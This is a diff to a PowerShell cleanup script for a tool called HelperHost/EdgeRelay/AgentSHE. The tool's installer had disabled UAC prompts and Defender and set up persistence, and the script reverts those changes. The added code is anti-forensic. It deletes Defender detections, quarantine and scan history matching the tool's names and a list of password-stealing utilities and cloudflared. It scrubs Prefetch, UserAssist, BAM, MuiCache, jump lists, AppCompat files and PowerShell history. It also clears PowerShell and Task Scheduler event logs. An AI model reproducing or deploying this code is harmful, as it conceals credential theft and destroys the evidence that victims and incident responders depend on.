@@ -3,8 +3,11 @@
 $ErrorActionPreference = 'SilentlyContinue'
 $hh = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $cache = Join-Path $env:TEMP 'HelperHostCache'
+$tools = Join-Path $hh 'tools'
 
-# --- UAC defaults (restore from backup if present) ---
+$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|hh-wipe|hh-restore|hh-export'
+
+# --- UAC (restore from backup if present) ---
 $sysPol = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
 $uacBak = Join-Path $hh 'uac-backup.json'
 $uj = $null
@@ -16,19 +19,25 @@ if (Test-Path $sysPol) {
   $cpa = 5; if ($uj -and $null -ne $uj.ConsentPromptBehaviorAdmin) { $cpa = [int]$uj.ConsentPromptBehaviorAdmin }
   $psd = 1; if ($uj -and $null -ne $uj.PromptOnSecureDesktop) { $psd = [int]$uj.PromptOnSecureDesktop }
   $eid = 1; if ($uj -and $null -ne $uj.EnableInstallerDetection) { $eid = [int]$uj.EnableInstallerDetection }
+  $cpu = 3; if ($uj -and $null -ne $uj.ConsentPromptBehaviorUser) { $cpu = [int]$uj.ConsentPromptBehaviorUser }
   Set-ItemProperty $sysPol -Name EnableLUA -Value $lua -Type DWord -Force
   Set-ItemProperty $sysPol -Name ConsentPromptBehaviorAdmin -Value $cpa -Type DWord -Force
+  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorUser -Value $cpu -Type DWord -Force
   Set-ItemProperty $sysPol -Name PromptOnSecureDesktop -Value $psd -Type DWord -Force
   Set-ItemProperty $sysPol -Name EnableInstallerDetection -Value $eid -Type DWord -Force
 }
 Remove-Item $uacBak -Force -EA SilentlyContinue
 
-# --- Defender Security Center / UX notification policies we may have set ---
+# --- Defender Security Center / UX / toast policies we set ---
 Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Force -EA SilentlyContinue
 Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableNotifications -Force -EA SilentlyContinue
 Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableEnhancedNotifications -Force -EA SilentlyContinue
 Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer' -Name DisableNotificationCenter -Force -EA SilentlyContinue
 Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Force -EA SilentlyContinue
+Remove-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Force -EA SilentlyContinue
+Remove-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoCloudApplicationNotification -Force -EA SilentlyContinue
+Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Force -EA SilentlyContinue
+Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotificationOnLockScreen -Force -EA SilentlyContinue
 if (Get-Command Set-MpPreference -EA SilentlyContinue) {
   Set-MpPreference -UILockdown $false -EA SilentlyContinue
 }
@@ -38,11 +47,6 @@ $wdPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
 Remove-ItemProperty $wdPol -Name DisableAntiSpyware -Force -EA SilentlyContinue
 Remove-ItemProperty $wdPol -Name DisableAntiVirus -Force -EA SilentlyContinue
 Remove-Item "$wdPol\Real-Time Protection" -Recurse -Force -EA SilentlyContinue
-# If folder empty of meaningful values, leave hive; don't delete whole key if org GPO owns it
-try {
-  $kids = @(Get-ChildItem $wdPol -EA SilentlyContinue)
-  $vals = @(Get-ItemProperty $wdPol -EA SilentlyContinue | Select-Object -ExpandProperty PSObject).Properties
-} catch {}
 
 # --- Defender services ---
 foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense')) {
@@ -52,23 +56,24 @@ foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense')) {
 
 # --- Defender preferences + drop our exclusions ---
 if (Get-Command Set-MpPreference -EA SilentlyContinue) {
-  Set-MpPreference -DisableRealtimeMonitoring $false
-  Set-MpPreference -DisableBehaviorMonitoring $false
-  Set-MpPreference -DisableBlockAtFirstSeen $false
-  Set-MpPreference -DisableIOAVProtection $false
-  Set-MpPreference -DisableScriptScanning $false
-  Set-MpPreference -DisableArchiveScanning $false
-  Set-MpPreference -DisableEmailScanning $false
-  Set-MpPreference -DisableRemovableDriveScanning $false
-  Set-MpPreference -PUAProtection Enabled
-  Set-MpPreference -MAPSReporting Advanced
-  Set-MpPreference -SubmitSamplesConsent 1
-  Set-MpPreference -EnableNetworkProtection Enabled
-  Set-MpPreference -CloudBlockLevel Default
+  Set-MpPreference -DisableRealtimeMonitoring $false -EA SilentlyContinue
+  Set-MpPreference -DisableBehaviorMonitoring $false -EA SilentlyContinue
+  Set-MpPreference -DisableBlockAtFirstSeen $false -EA SilentlyContinue
+  Set-MpPreference -DisableIOAVProtection $false -EA SilentlyContinue
+  Set-MpPreference -DisableScriptScanning $false -EA SilentlyContinue
+  Set-MpPreference -DisableArchiveScanning $false -EA SilentlyContinue
+  Set-MpPreference -DisableEmailScanning $false -EA SilentlyContinue
+  Set-MpPreference -DisableRemovableDriveScanning $false -EA SilentlyContinue
+  Set-MpPreference -PUAProtection Enabled -EA SilentlyContinue
+  Set-MpPreference -MAPSReporting Advanced -EA SilentlyContinue
+  Set-MpPreference -SubmitSamplesConsent 1 -EA SilentlyContinue
+  Set-MpPreference -EnableNetworkProtection Enabled -EA SilentlyContinue
+  Set-MpPreference -CloudBlockLevel Default -EA SilentlyContinue
 }
 if (Get-Command Remove-MpPreference -EA SilentlyContinue) {
   Remove-MpPreference -ExclusionPath $hh -EA SilentlyContinue
   Remove-MpPreference -ExclusionPath $cache -EA SilentlyContinue
+  Remove-MpPreference -ExclusionPath $tools -EA SilentlyContinue
   Remove-MpPreference -ExclusionProcess 'HelperHost.exe' -EA SilentlyContinue
   Remove-MpPreference -ExclusionProcess 'EdgeRelay.exe' -EA SilentlyContinue
   if (Test-Path (Join-Path $hh 'HelperHost.exe')) {
@@ -79,22 +84,39 @@ if (Get-Command Remove-MpPreference -EA SilentlyContinue) {
   }
 }
 
+# Clear local Defender detections / history tied to our names (best-effort)
+try {
+  Get-MpThreatDetection -EA SilentlyContinue | Where-Object {
+    ($_.Resources -join ' ') -match $mark
+  } | ForEach-Object {
+    Remove-MpThreat -ThreatID $_.ThreatID -EA SilentlyContinue
+  }
+} catch {}
+$defPaths = @(
+  "$env:ProgramData\Microsoft\Windows Defender\Quarantine",
+  "$env:ProgramData\Microsoft\Windows Defender\Scans\History",
+  "$env:LOCALAPPDATA\Packages\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\LocalState"
+)
+foreach ($dp in $defPaths) {
+  if (Test-Path $dp) {
+    Get-ChildItem $dp -Recurse -Force -EA SilentlyContinue | Where-Object {
+      $_.Name -match $mark -or $_.FullName -match $mark
+    } | Remove-Item -Recurse -Force -EA SilentlyContinue
+  }
+}
+
 # --- Undo Soft Device Guard / SAC toggles from install (best-effort) ---
 $ci = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
-# 1 = Evaluation (safer than forcing Enforce)
 if (Test-Path $ci) {
   $cur = (Get-ItemProperty $ci -Name VerifiedAndReputablePolicyState -EA SilentlyContinue).VerifiedAndReputablePolicyState
   if ($null -ne $cur -and [int]$cur -eq 0) {
     Set-ItemProperty $ci -Name VerifiedAndReputablePolicyState -Value 1 -Type DWord -Force -EA SilentlyContinue
   }
 }
-# Do not force VBS back ON (can break systems); only clear Locked flag we may have set
 $dg = 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard'
 if (Test-Path $dg) {
   Remove-ItemProperty $dg -Name Locked -Force -EA SilentlyContinue
 }
-
-# bcdedit: restore defaults if we turned hypervisor off
 & bcdedit.exe /set '{current}' hypervisorlaunchtype Auto | Out-Null
 & bcdedit.exe /deletevalue '{current}' vsmlaunchtype | Out-Null
 
@@ -107,55 +129,104 @@ foreach ($tn in @(
   schtasks /Delete /TN $tn /F 2>$null | Out-Null
 }
 
-# --- Run key (Win+R persistence) ---
+# --- Run key ---
 $run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 foreach ($n in @('HelperHost', 'AgentShePC')) {
   Remove-ItemProperty -Path $run -Name $n -Force -EA SilentlyContinue
 }
 
-# --- RunMRU (Win+R history) ---
+# --- RunMRU ---
 $mru = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
 if (Test-Path $mru) {
   $props = Get-ItemProperty $mru -EA SilentlyContinue
   $drop = @()
   foreach ($p in $props.PSObject.Properties) {
     if ($p.Name -in @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider', 'MRUList')) { continue }
-    $v = [string]$p.Value
-    if ($v -match 'HelperHost|EdgeRelay|AgentSHE|agentshe|install-win|install\.ps1|lilygopro|AGENTSHE_|trycloudflare') {
-      $drop += $p.Name
-    }
+    if ([string]$p.Value -match $mark) { $drop += $p.Name }
   }
   foreach ($n in $drop) { Remove-ItemProperty -Path $mru -Name $n -Force -EA SilentlyContinue }
-  # Rebuild MRUList simply: clear if we removed anything
-  if ($drop.Count -gt 0) {
-    Remove-ItemProperty -Path $mru -Name MRUList -Force -EA SilentlyContinue
+  if ($drop.Count -gt 0) { Remove-ItemProperty -Path $mru -Name MRUList -Force -EA SilentlyContinue }
+}
+
+# --- UserAssist / BAM / AppCompat flags mentioning us ---
+$ua = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist'
+Get-ChildItem $ua -Recurse -EA SilentlyContinue | ForEach-Object {
+  try {
+    $item = $_
+    $vals = Get-ItemProperty $item.PSPath -EA SilentlyContinue
+    foreach ($p in $vals.PSObject.Properties) {
+      if ($p.Name -match 'PS') { continue }
+      if ($p.Name -match $mark) {
+        Remove-ItemProperty -Path $item.PSPath -Name $p.Name -Force -EA SilentlyContinue
+      }
+    }
+  } catch {}
+}
+Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings' -EA SilentlyContinue | ForEach-Object {
+  $vals = Get-ItemProperty $_.PSPath -EA SilentlyContinue
+  foreach ($p in $vals.PSObject.Properties) {
+    if ($p.Name -match 'PS') { continue }
+    if ($p.Name -match $mark -or ([string]$p.Value -match $mark)) {
+      Remove-ItemProperty -Path $_.PSPath -Name $p.Name -Force -EA SilentlyContinue
+    }
+  }
+}
+Get-ChildItem 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache' -EA SilentlyContinue | Out-Null
+$mui = 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
+if (Test-Path $mui) {
+  $vals = Get-ItemProperty $mui -EA SilentlyContinue
+  foreach ($p in $vals.PSObject.Properties) {
+    if ($p.Name -match 'PS') { continue }
+    if ($p.Name -match $mark -or ([string]$p.Value -match $mark)) {
+      Remove-ItemProperty -Path $mui -Name $p.Name -Force -EA SilentlyContinue
+    }
   }
 }
 
 # --- Temp / leftover install artifacts ---
-Get-ChildItem $env:TEMP -Filter 'HelperHost-elev-*.ps1' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
-Get-ChildItem $env:TEMP -Filter 'HelperHost-install.*' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
-Get-ChildItem $env:TEMP -Filter 'hh-wipe.cmd' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
-Remove-Item (Join-Path $env:TEMP 'HelperHost-install.ok') -Force -EA SilentlyContinue
-Remove-Item (Join-Path $env:TEMP 'HelperHost-install.err') -Force -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'HelperHost-*' -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'hh-*' -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
+Get-ChildItem $env:TEMP -Filter 'hh-export-*' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
 
-# Prefetch
-Get-ChildItem "$env:SystemRoot\Prefetch" -Filter 'HELPERHOST*' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
-Get-ChildItem "$env:SystemRoot\Prefetch" -Filter 'EDGERELAY*' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
-
-# PS history lines
-$hist = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
-if (Test-Path $hist) {
-  $re = 'HelperHost|EdgeRelay|agentshe|AgentSHE|lilygopro|install\.ps1|install-win|HelperHostCache|AGENTSHE_|trycloudflare'
-  (Get-Content $hist -EA SilentlyContinue) | Where-Object { $_ -notmatch $re } | Set-Content $hist -Encoding UTF8
+# Prefetch (HelperHost + tools + cloudflared rename)
+$pf = "$env:SystemRoot\Prefetch"
+if (Test-Path $pf) {
+  Get-ChildItem $pf -EA SilentlyContinue | Where-Object {
+    $_.Name -match '^(HELPERHOST|EDGERELAY|CHROMEPASS|WEBBROWSERPASSVIEW|PASSWORDFOX|MAILPV|MSPASS|NETPASS|IEPV|DIALUPASS|PSTPASSWORD|CLOUDFLARED)'
+  } | Remove-Item -Force -EA SilentlyContinue
 }
 
-# Recent / Jump lists soft clean
-$recent = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
-Get-ChildItem $recent -EA SilentlyContinue | Where-Object {
-  $_.Name -match 'HelperHost|install-win|install\.ps1|AgentSHE'
-} | Remove-Item -Force -EA SilentlyContinue
+# Recent / Jump lists / AutomaticDestinations soft clean
+foreach ($recentRoot in @(
+  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent'),
+  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\AutomaticDestinations'),
+  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\CustomDestinations')
+)) {
+  Get-ChildItem $recentRoot -Force -EA SilentlyContinue | Where-Object {
+    $_.Name -match $mark -or (Get-Content $_.FullName -Raw -EA SilentlyContinue) -match $mark
+  } | Remove-Item -Force -EA SilentlyContinue
+}
 
+# PS / cmd history
+$hist = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
+if (Test-Path $hist) {
+  (Get-Content $hist -EA SilentlyContinue) | Where-Object { $_ -notmatch $mark } | Set-Content $hist -Encoding UTF8
+}
+
+# AppCompat / Shimcache hint files (cannot fully clear Amcache without reboot; purge matching)
+$am = "$env:ProgramData\Microsoft\Windows\AppCompat\Programs"
+if (Test-Path $am) {
+  Get-ChildItem $am -Recurse -Force -EA SilentlyContinue | Where-Object {
+    $_.Name -match $mark -or $_.FullName -match $mark
+  } | Remove-Item -Force -Recurse -EA SilentlyContinue
+}
+
+# Event logs: clear only channels we commonly hit (needs admin) — leave Security alone if access denied
+foreach ($log in @('Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-TaskScheduler/Operational')) {
+  try { wevtutil cl $log 2>$null } catch {}
+}
+
+# --- Restore notification settings from backup ---
 $bak = Join-Path $hh 'notify-backup.json'
 $push = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications'
 $exp = 'HKCU:\Software\Policies\Microsoft\Windows\Explorer'
@@ -185,7 +256,13 @@ Remove-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOC
 foreach ($sub in @(
   'Windows.SystemToast.SecurityAndMaintenance',
   'Windows.SystemToast.WindowsUpdate.Notification',
-  'Windows.SystemToast.Explorer'
+  'Windows.SystemToast.Explorer',
+  'Windows.SystemToast.StartupApp',
+  'Windows.SystemToast.Suggested',
+  'Windows.SystemToast.AudioTroubleshooter',
+  'Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI',
+  'Windows.SystemToast.WindowsDefender.SecurityCenter',
+  'Windows.SystemToast.WindowsDefender.Av'
 )) {
   $p = "$ns\$sub"
   if (Test-Path $p) { Set-ItemProperty $p -Name Enabled -Value 1 -Type DWord -Force }
